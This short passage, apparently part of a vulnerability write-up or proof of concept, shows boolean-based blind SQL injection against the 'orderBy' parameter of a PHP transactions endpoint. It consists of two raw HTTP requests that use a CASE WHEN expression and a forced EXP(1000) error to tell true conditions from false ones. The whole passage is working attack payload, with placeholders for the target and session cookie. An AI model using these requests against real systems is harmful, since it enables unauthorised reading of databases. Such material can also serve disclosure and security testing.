## 2. Boolean-based blind injection

# condition TRUE -> HTTP 200 (data)
GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=1 THEN 1 ELSE EXP(1000) END) HTTP/1.1
Host: <TARGET>
Cookie: <session>

# condition FALSE -> HTTP 500 (Database Error)
GET /index.php/transactions/latr_?orderBy=(SELECT CASE WHEN 1=2 THEN 1 ELSE EXP(1000) END) HTTP/1.1
Host: <TARGET>
Cookie: <session>
